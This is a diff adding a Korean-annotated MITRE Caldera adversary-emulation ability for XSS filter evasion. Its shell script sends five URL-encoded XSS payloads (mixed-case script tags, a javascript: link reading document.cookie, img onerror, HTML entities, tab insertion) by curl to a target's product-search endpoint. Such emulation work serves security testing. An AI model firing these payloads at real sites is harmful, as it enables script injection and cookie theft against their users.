@@ -1,0 +1,51 @@
+- id: d3c4d5e6-7f8a-9b0c-1d2e-a3b4c5d6e7f8
+  name: XSS Filter Evasion - Encoding and Obfuscation
+  description: 기본 XSS 필터를 우회하기 위한 인코딩 및 난독화 기법을 사용합니다. 대소문자 혼합, HTML 엔티티 인코딩, JavaScript 프로토콜, 이벤트 핸들러 변형 등 다양한 우회 페이로드를 테스트합니다. Defense Evasion 관점의 XSS 공격입니다.
+  tactic: initial-access
+  technique:
+    attack_id: T1059.007
+    name: 'Command and Scripting Interpreter: JavaScript'
+  platforms:
+    linux:
+      sh:
+        command: |-
+          OP_ID="#{operation_id}"
+          TECH_ID="T1059.007"
+          ABILITY_ID="d3c4d5e6-7f8a-9b0c-1d2e-a3b4c5d6e7f8"
+          TARGET="http://#{target.url}"
+
+          # 우회 페이로드 배열 (URL-encoded)
+          EVASION_PAYLOADS=(
+            # 1. 대소문자 혼합: <ScRiPt>alert(1)</ScRiPt>
+            "%3CScRiPt%3Ealert%281%29%3C%2FScRiPt%3E"
+            # 2. javascript: 프로토콜 (href 속성 주입)
+            "%3Ca+href%3D%22javascript%3Aalert%28document.cookie%29%22%3Eclick%3C%2Fa%3E"
+            # 3. 이벤트 핸들러 + 슬래시 우회: <img/src=x onerror=alert(1)>
+            "%3Cimg%2Fsrc%3Dx+onerror%3Dalert%281%29%3E"
+            # 4. HTML 엔티티 인코딩: &#60;script&#62;
+            "%26%2360%3Bscript%26%2362%3Balert%281%29%26%2360%3B%2Fscript%26%2362%3B"
+            # 5. 탭/개행 삽입: <scr\tip\tt>
+            "%3Cscr%09ip%09t%3Ealert%281%29%3C%2Fscr%09ip%09t%3E"
+          )
+
+          LABELS=(
+            "Mixed case: <ScRiPt>"
+            "javascript: protocol in href"
+            "Slash bypass: <img/src=x onerror>"
+            "HTML entity encoding: &#60;script&#62;"
+            "Tab insertion: <scr\\tip\\tt>"
+          )
+
+          for i in "${!EVASION_PAYLOADS[@]}"; do
+            echo "[*] XSS Evasion $((i+1)): ${LABELS[$i]}"
+            RESULT=$(curl -s -o /dev/null -w "%{http_code}" \
+              -H "X-Caldera-Op-Id: ${OP_ID}" \
+              -H "X-Caldera-Technique: ${TECH_ID}" \
+              -H "X-Caldera-Ability: ${ABILITY_ID}" \
+              -A "Caldera/${OP_ID}/${TECH_ID}/${ABILITY_ID}" \
+              "${TARGET}/api/products/search?keyword=${EVASION_PAYLOADS[$i]}")
+            echo "[+] HTTP ${RESULT}"
+          done
+        parsers:
+          plugins.stockpile.app.parsers.basic:
+          - source: host.vuln.xss.evasion
